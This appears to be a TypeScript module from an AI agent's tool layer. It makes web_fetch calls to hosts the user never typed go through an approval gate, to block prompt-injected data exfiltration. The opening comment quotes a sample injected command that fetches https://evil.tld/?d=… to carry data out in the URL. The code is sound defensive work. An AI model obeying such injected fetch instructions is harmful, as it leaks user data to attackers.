// web_fetch can carry data out in its URL, so a prompt-injected "fetch https://evil.tld/?d=…"
// must not run unattended. A host the user typed (not attached files, tool output or handoffs)
// is vetted; any other host goes through the approval gate (and is refused in Read only mode).

const URL_RE = /\bhttps?:\/\/[^\s<>"'`)\]]+/gi
const BARE_HOST_RE = /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi
// Bare names only count with a common web TLD, so file names like main.py or README.md
// (also real TLDs) don't vet a domain an attacker could register.
const BARE_HOST_TLDS = new Set(['com', 'org', 'net', 'io', 'dev', 'ai', 'co', 'uk', 'app', 'gov', 'edu', 'info', 'tech', 'cloud', 'so', 'sh', 'me'])

/** Lower-cased hostname of a web_fetch call's `url`, or null when it isn't a parsable http(s) URL. */
export function webFetchHost(args: unknown): string | null {
  const raw = (args as { url?: unknown } | null)?.url
  if (typeof raw !== 'string') return null
  try {
    const url = new URL(raw.trim())
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
    return url.hostname.toLowerCase().replace(/\.$/, '') || null
  } catch {
    return null
  }
}

/** Hosts named in the user's typed messages (links or bare domains), lower-cased. */
export function userMentionedHosts(userTexts: string[]): Set<string> {
  const hosts = new Set<string>()
  for (const text of userTexts) {
    for (const match of text.match(URL_RE) ?? []) {
      try { hosts.add(new URL(match).hostname.toLowerCase().replace(/\.$/, '')) } catch { /* not a URL */ }
    }
    for (const match of text.match(BARE_HOST_RE) ?? []) {
      const host = match.toLowerCase()
      if (BARE_HOST_TLDS.has(host.slice(host.lastIndexOf('.') + 1))) hosts.add(host)
    }
  }
  return hosts
}

/** True when this web_fetch call targets a host the user never named, so it needs approval. */
export function webFetchNeedsApproval(args: unknown, userTexts: string[]): boolean {
  const host = webFetchHost(args)
  if (!host) return true
  const vetted = userMentionedHosts(userTexts)
  // `docs.example.com` is vetted by `example.com` only when the user wrote the parent.
  return ![...vetted].some((name) => host === name || host.endsWith(`.${name}`))
}
